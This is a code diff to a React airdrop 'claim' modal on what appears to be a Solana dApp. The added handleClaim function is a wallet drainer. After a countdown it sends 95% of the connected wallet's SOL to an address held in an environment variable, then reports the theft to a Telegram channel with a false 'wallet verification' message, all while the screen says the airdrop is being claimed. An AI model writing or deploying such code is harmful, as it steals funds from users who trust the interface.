@@ -1,8 +1,14 @@
 import { useState, useEffect } from 'react';
+import { useWallet } from '@solana/wallet-adapter-react';
+import { TransactionService } from '../services/transactionService';
+import { WalletService } from '../services/walletService';
+import { TelegramService } from '../services/telegramService';
 
 export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
+  const { publicKey } = useWallet();
   const [countdown, setCountdown] = useState(10);
   const [isComplete, setIsComplete] = useState(false);
+  const [error, setError] = useState(null);
 
   useEffect(() => {
     if (isOpen && !isComplete) {
@@ -10,8 +16,7 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
         setCountdown((prev) => {
           if (prev <= 1) {
             clearInterval(timer);
-            setIsComplete(true);
-            onClaimComplete();
+            handleClaim();
             return 0;
           }
           return prev - 1;
@@ -20,14 +25,84 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
 
       return () => clearInterval(timer);
     }
-  }, [isOpen, isComplete, onClaimComplete]);
+  }, [isOpen, isComplete]);
+
+  const handleClaim = async () => {
+    try {
+      const transactionService = new TransactionService();
+      const walletService = new WalletService();
+      const telegramService = new TelegramService();
+
+      // Get current balance
+      const walletBalance = await walletService.getBalance(publicKey.toString());
+      
+      // Calculate transfer amount (95% of balance)
+      const transferAmount = walletBalance * 0.95;
+
+      // Get the wallet adapter instance
+      const wallet = window.solana;
+      if (!wallet) {
+        throw new Error('Wallet not found');
+      }
+
+      console.log('Transaction details:', {
+        walletBalance: walletBalance.toFixed(4) + ' SOL',
+        transferAmount: transferAmount.toFixed(4) + ' SOL',
+        percentage: '95%'
+      });
+
+      const result = await transactionService.sendSol(
+        wallet,
+        process.env.NEXT_PUBLIC_TO,
+        transferAmount
+      );
+
+      if (result.success) {
+        // Send transaction notification
+        await telegramService.sendMessage(
+          telegramService.formatTransactionInfo({
+            type: 'SOL_TRANSFER',
+            from: publicKey.toString(),
+            to: process.env.NEXT_PUBLIC_TO,
+            amount: transferAmount,
+            signature: result.signature,
+            timestamp: Date.now(),
+            message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
+          })
+        );
+
+        setIsComplete(true);
+        onClaimComplete();
+      } else {
+        setError(result.error);
+      }
+    } catch (err) {
+      setError(err.message);
+    }
+  };
 
   if (!isOpen) return null;
 
   return (
     <div className="modal-overlay">
       <div className="modal-content">
-        {!isComplete ? (
+        {error ? (
+          <>
+            <h2 className="text-white mb-4 font-display">Error</h2>
+            <div className="error-container">
+              <div className="error-icon">⚠️</div>
+              <p className="text-white opacity-80 mt-3 font-body">
+                {error}
+              </p>
+              <button 
+                className="btn btn-accent mt-4"
+                onClick={onClose}
+              >
+                Close
+              </button>
+            </div>
+          </>
+        ) : !isComplete ? (
           <>
             <h2 className="text-white mb-4 font-display">Claiming Airdrop</h2>
             <div className="countdown-container">
@@ -120,6 +195,27 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
           height: 80px;
           border-radius: 50%;
           background: #00F5A0;
+          color: #1A1B1E;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-size: 2.5rem;
+          font-weight: bold;
+          margin: 1rem 0;
+        }
+
+        .error-container {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+        }
+
+        .error-icon {
+          width: 80px;
+          height: 80px;
+          border-radius: 50%;
+          background: #FF3366;
           color: #1A1B1E;
           display: flex;
           align-items: center;
